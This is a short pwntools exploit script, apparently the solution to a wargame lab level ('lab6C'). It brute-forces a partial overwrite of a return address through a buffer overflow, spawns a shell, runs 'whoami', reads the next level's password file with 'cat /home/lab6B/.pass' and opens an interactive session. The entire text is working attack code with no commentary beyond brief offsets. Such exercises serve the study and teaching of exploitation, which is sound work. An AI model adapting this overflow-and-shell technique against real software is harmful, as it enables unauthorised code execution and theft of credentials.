import pwn

rv = ''
while not 'lab6B' in rv:
  p = pwn.process('/levels/lab06/lab6C')
  p.recv(500)

  # 196 (offset to return addr) + 2 bytes to partially overwrite = 198 or 0xc6 total
  p.sendline('a' * 40 + '\xc6')
  p.recv(500)

  breakit = 'a' * 196 + pwn.p32(0x72b)
  p.sendline(breakit)

  # taking control
  try:
    p.sendline('/bin/sh')
    p.sendline('whoami')

    rv = p.recv(500)
  except:
    continue


p.sendline('cat /home/lab6B/.pass')
rv = p.recv(500)
print('Lab6B Password: ' + rv)

p.interactive()
